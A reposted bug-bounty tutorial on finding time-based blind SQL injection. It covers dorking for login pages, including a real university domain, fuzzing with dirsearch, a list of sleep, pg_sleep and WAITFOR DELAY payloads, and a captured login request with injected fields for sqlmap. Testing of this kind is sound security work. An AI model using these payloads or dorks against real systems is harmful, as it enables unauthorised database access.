---
description: >-
  source:
  https://adityashende17.medium.com/finding-time-based-sqli-injections-edition-2023-8e079127b56a
---

# 🔎 Finding Time Based SQLi injections : Edition 2023

Hi everyone,

I am Aditya Shende (Kong) from India. A Bounty Hunter , Biker and Researcher.

This is my 4th article , If you found any spell error. Let it be….. Lets start

<figure><img src="https://miro.medium.com/v2/resize:fit:600/1*yRI_Y8k8sfHQde6BDevZwA.gif" alt="" height="480" width="480"><figcaption></figcaption></figure>

## **What exactly time based SQL injection is ?** <a href="#6653" id="6653"></a>

An instance of an inferential injection or blind injection attack is time-based SQL injection. A sort of attack known as an inferential injection attack prevents data from being exchanged between the attacker and the database, making it more difficult for the attacker to obtain results than in an in-band injection assault. Because of this, it is often referred to as a blind injection attack. Inside the database, a hacker has the ability to reconstruct and create a new database structure.

An attacker who wants to postpone the execution of the queries sends a SQL command to the server in a time-based attack.

If the query’s result is true or false, the response time shows it. The attacker will issue another query based on the reply. Because the attacker has to enumerate each character by character, this is usually a slow intrusion technique, especially for large databases.

## **Where I look for time based SQLi ?** <a href="#a9c9" id="a9c9"></a>

1. Login pages
2. Headers
3. GET parameters | Sometimes

Mostly I focus on Login pages and try to check if ORG is using jsp,php or aspx in any domain or not.

## **Methodology:** <a href="#af0e" id="af0e"></a>

1. You can simply find open login page from google dorking . Like this

Dork site:=.\*.\*.wur.nl inurl:login | inurl:signin | intitle:Login | intitle:”sign in” | inurl:auth

Dork site:=.\*.\*.your\_target.com inurl:login | inurl:signin | intitle:Login | intitle:”sign in” | inurl:auth

You can use [https://pentest-tools.com/information-gathering/google-hacking](https://pentest-tools.com/information-gathering/google-hacking) for dorking to find login pages.

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*87gpHRP4OcU-DceexsdCVA.png" alt="" height="394" width="700"><figcaption></figcaption></figure>

I am not coding guy or traditional person who checks each code to balance everything but sharing the method which I use for BSQLi.

## **2. Using shodan** <a href="#6fdc" id="6fdc"></a>

You can use following dork to check if any of domain /IP contains auth page or not

> Dork : http.title:”WUR”

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*5IzFhiL8yvjNO6BvGQBNQw.png" alt="" height="394" width="700"><figcaption></figcaption></figure>

## 3. **FUZZ** <a href="#f17a" id="f17a"></a>

Nothing special here . I just use one command of dirsearch (OLD SKOOL HECKER)

dirsearch.py -l target.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx\~,asp\~,py,py\~,rb,rb\~,php,php\~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp\~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql\~,swp,swp\~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 — full-url

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*GgM8BDDGamckqAmk79DuMw.png" alt="" height="195" width="700"><figcaption></figcaption></figure>

Finally after grabbing all points , logins, IPs . Time for exploitation

## **Exploitation** <a href="#1202" id="1202"></a>

Take all the login pages and open it in firefox .

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*inbUKI4nQmyJ7TraI02AMg.png" alt="" height="254" width="700"><figcaption></figcaption></figure>

1. Enter anything in username and password
2. Send request to intruder
3. Use following payloads (I use this mostly)
4. Add username and password as attack position
5. Select attack type as pitchfork and paste payloads
6. Start attack

Now observe response length and status code

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*zEnWXI8449ilWf1sE31Grg.png" alt="" height="394" width="700"><figcaption></figcaption></figure>

or sleep 5 —\
or sleep 5\
or sleep(5) —\
or sleep(5)

or SELECT pg\_sleep(5);\
(SELECT pg\_sleep(5))\
pg\_sleep(5) —\
1 or pg\_sleep(5) —\
“ or pg\_sleep(5) —\
‘ or pg\_sleep(5) —\
1\) or pg\_sleep(5) —

;waitfor delay ‘0:0:5’ —\
‘;WAITFOR DELAY ‘0:0:5’ —\
);waitfor delay ‘0:0:5’ —\
‘;waitfor delay ‘0:0:5’ —\
“;waitfor delay ‘0:0:5’ —\
‘);waitfor delay ‘0:0:5’ —\
“);waitfor delay ‘0:0:5’ —\
));waitfor delay ‘0:0:5’ —\
‘));waitfor delay ‘0:0:5’ —\
“));waitfor delay ‘0:0:5’ —\
“) IF (1=1) WAITFOR DELAY ‘0:0:5’ —\
‘;%5waitfor%5delay%5’0:0:5'%5 — %5\
‘ WAITFOR DELAY ‘0:0:5’ —

Explore payloads from : [https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1](https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1)

Once you see weird length or status code is not visible in intruder then take that request in sqlmap

Copy request and create txt file in ubuntu: cat > request.txt

> POST /products/der/admin/index.php HTTP/1.1\
> Host: stite.net\
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8\
> Accept-Language: en-US,en;q=0.5\
> Accept-Encoding: gzip, deflate\
> Content-Type: application/x-www-form-urlencoded\
> Content-Length: 110\
> Origin: https://site.der.net\
> Connection: close\
> Cookie: PHPSESSID=ckpekt03vhn9mlgaapa50kujt3; \_ga\_97C2F8CQVY=GS1.1.1672995465.1.0.1672995465.0.0.0; \_ga=GA1.1.582203600.1672995466\
> Upgrade-Insecure-Requests: 1\
> Sec-Fetch-Dest: document\
> Sec-Fetch-Mode: navigate\
> Sec-Fetch-Site: same-origin\
> Sec-Fetch-User: ?1
>
> username=’%3b%5waitfor%5delay%5'0%3a0%3a5'%5\
> \-\
> %5\&password=’%3b%5waitfor%5delay%5'0%3a0%3a5'%5\
> \-\
> %5\&btn\_login=

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*xXR_lb4QKkFeIPb3SYpdXA.png" alt="" height="334" width="700"><figcaption></figcaption></figure>

Remaining things will be done by tools.

Note: This is just method which I use . I don’t promote or force to use this. Varies person to person .

Thanks

Kongsec
